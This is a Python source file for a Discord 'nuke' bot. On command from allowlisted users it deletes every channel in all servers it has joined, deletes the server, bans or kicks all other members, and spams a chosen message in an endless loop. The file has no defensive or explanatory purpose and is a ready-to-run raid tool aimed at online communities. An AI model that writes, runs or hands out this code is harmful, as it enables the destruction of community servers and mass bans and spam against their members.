import discord

intents = discord.Intents.all()
client = discord.Client(intents=intents)

god_user = 'YOUR_USER_ID'
allowed_users = ['YOUR_USER_ID', 'YOUR_BOT_USER_ID'] # You can add more ID's



@client.event
async def on_message(message):
  if str(message.author.id) in allowed_users:
      if message.content == '!bot deletechn':
        await message.channel.send('Deleting Channels... ')
        for guild in client.guilds:
            for channel in guild.channels:
                await channel.delete()
      elif message.content == '!bot deletesrv':
        await message.channel.send('Deleting Server... ')
        await message.guild.delete()
      elif (message.content.startswith('!bot adduser')
       and str(message.author.id) == god_user):
        user_id = message.content.split(' ')[2]
        allowed_users.append(user_id)
        await message.channel.send(f'User {user_id} has been added to the allowed users list.')
      elif (message.content.startswith('!bot removeuser')
         and str(message.author.id) == god_user):
          user_id = message.content.split(' ')[2]
          if user_id in allowed_users:
            allowed_users.remove(user_id)
            await message.channel.send(f'User {user_id} has been removed from the allowed users list.')
      elif message.content.startswith('!bot spam'):
       split_message = message.content.split(' ')
       if len(message.content) > 13:
        spam_message = " ".join(split_message[2:])
        while True:
          await message.channel.send(spam_message)
       else:
        await message.channel.send('Please provide a message to spam')
      elif message.content == '!bot':
        await message.channel.send("")
      elif message.content == '!animebot help':
        await message.channel.send('figure out urself')
      elif message.content == '!bot ban all':
        for guild in client.guilds:
          for member in guild.members:
              if str(member.id) not in allowed_users:
                  await message.channel.send(f'Banning {member.name}')
                  await member.ban()
      elif message.content == '!bot kick all':
        for guild in client.guilds:
         for member in guild.members:
              if str(member.id) not in allowed_users:
                 await message.channel.send(f'Kicking {member.name}')
                 await member.kick()
client.run('YOUR_BOT_TOKEN')
